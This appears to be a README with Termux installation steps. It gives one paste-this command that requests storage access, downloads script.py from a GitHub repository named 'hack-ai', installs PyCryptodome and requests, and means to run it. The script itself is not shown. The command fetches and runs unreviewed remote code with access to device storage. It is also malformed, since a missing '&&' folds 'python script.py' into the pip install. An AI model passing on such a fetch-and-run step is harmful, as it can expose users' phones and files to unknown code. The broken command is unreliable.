
# Termux Installation

Hi! To install and run the script, just copy and paste the command line below into Termux. 

*(The system will automatically check if you already granted storage access so it won't ask again. If not, tap "Allow" when the popup appears).*

```bash
{ [ -d ~/storage ] || termux-setup-storage; } && curl -o script.py https://raw.githubusercontent.com/Mamadara/hack-ai/refs/heads/main/script.py && pip install PyCryptodome requests python script.py
```
